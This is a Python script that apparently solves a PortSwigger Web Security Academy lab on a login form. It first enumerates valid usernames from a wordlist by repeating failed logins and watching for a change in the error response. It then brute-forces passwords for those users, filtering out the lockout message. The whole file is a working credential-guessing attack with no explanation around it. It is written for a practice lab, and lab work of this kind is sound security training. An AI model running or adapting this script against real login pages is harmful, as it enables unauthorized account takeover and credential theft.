import requests
from time import sleep

url = 'https://0a4d007804c7a84a813520c500b60099.web-security-academy.net/login' 

valid_users = []
users= [line.strip() for line in open("../users.txt", "r")]
for user in users:
    for i in range(5):
        payload = {"username" : user, "password" : "a"*10}
        owo = requests.post(url, data=payload)
        if "Invalid" in owo.text:
            continue
        else:
            valid_users.append(user)
            print(user)


pwds= [line.strip() for line in open("../pass.txt", "r")]
for user in valid_users:
    for pwd in pwds:
        payload = {"username" : user, "password" : pwd}
        owo = requests.post(url, data=payload)
        if not "Invalid" in owo.text and not "You have made too many incorrect login attempts. Please try again in 1 minute(s)." in owo.text:
            print(pwd)

